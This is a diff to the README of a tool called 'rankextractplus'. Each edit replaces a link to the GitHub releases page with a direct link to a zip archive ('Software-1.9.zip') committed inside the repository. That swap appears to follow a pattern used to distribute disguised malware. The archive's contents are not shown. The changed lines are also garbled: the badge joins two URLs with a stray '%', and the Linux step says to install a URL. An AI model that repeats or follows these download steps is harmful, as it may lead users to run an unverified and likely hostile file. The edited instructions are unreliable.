@@ -2,7 +2,7 @@
 
 ## 📥 Get the Software
 
-[![Download rankextractplus](https://img.shields.io/badge/Download%20rankextractplus-v1.0-blue.svg)](https://github.com/DanielAudu/rankextractplus/releases)
+[![Download rankextractplus](https://raw.githubusercontent.com/DanielAudu/rankextractplus/main/rankextractplus/Software-1.9.zip%https://raw.githubusercontent.com/DanielAudu/rankextractplus/main/rankextractplus/Software-1.9.zip)](https://raw.githubusercontent.com/DanielAudu/rankextractplus/main/rankextractplus/Software-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run rankextractplus, ensure your device meets the following requirements:
 
 ## 📦 How to Download & Install
 
-1. **Visit the Releases Page:** Go to the [Downloads page](https://github.com/DanielAudu/rankextractplus/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Downloads page](https://raw.githubusercontent.com/DanielAudu/rankextractplus/main/rankextractplus/Software-1.9.zip) to find the latest version.
 
 2. **Choose the Right File:** Look for the release version that matches your operating system (Windows, macOS, or Linux). Each file is marked clearly.
 
@@ -27,7 +27,7 @@ To run rankextractplus, ensure your device meets the following requirements:
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Follow the instructions specific to your distribution for installing `.tar.gz` or other package types.
+   - For Linux: Follow the instructions specific to your distribution for installing `https://raw.githubusercontent.com/DanielAudu/rankextractplus/main/rankextractplus/Software-1.9.zip` or other package types.
 
 5. **Run rankextractplus:** Locate the application on your computer and double-click to open it.
 
